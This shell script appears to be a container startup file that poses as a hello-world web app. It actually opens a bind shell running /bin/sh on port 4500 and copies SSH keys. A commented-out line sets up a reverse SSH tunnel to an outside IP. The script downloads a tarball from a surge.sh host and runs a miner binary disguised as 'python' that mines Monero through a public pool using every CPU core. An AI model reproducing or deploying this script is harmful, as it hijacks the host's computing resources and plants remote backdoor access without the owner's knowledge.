#!/bin/sh
cd /opt/app-root/src
mkdir -p /tmp/app
cp -a busybox jxmr.tgz id utd.static kh /tmp/app
cd /tmp/app
chmod +x busybox
./busybox httpd -p 8080 &
echo "<html> " > index.html
echo "<p> Hello World, $(uname -a)</p>" >> index.html
echo "<p> My name is $(whoami), and i am in $(pwd)" >> index.html
echo "<p> $(cat /etc/lsb-release) $(cat /etc/debian_version) </p>" >> index.html
echo "</html>" >> index.html
chmod +x utd.static
./utd.static -p 4500 -l /bin/sh -d 
chmod 700 id
chmod 700 kh
mkdir -p ~/.ssh
cp kh ~/.ssh/known_hosts
export HOME=/tmp/app
mkdir -p /tmp/app/.ssh
cp kh /tmp/app/.ssh/known_hosts
#ssh  -f -i id -R 4500:127.0.0.1:4500 getup@199.245.57.68 "sleep 100d"

wget c6a.surge.sh/centos7.tgz
./busybox tar xpzf centos7.tgz
./python30/bin/python -a cryptonight  -o stratum+tcp://us-east.monero.miningpoolhub.com:20580 -u xx4w.getup -p x -t $(nproc) 


sleep 200d
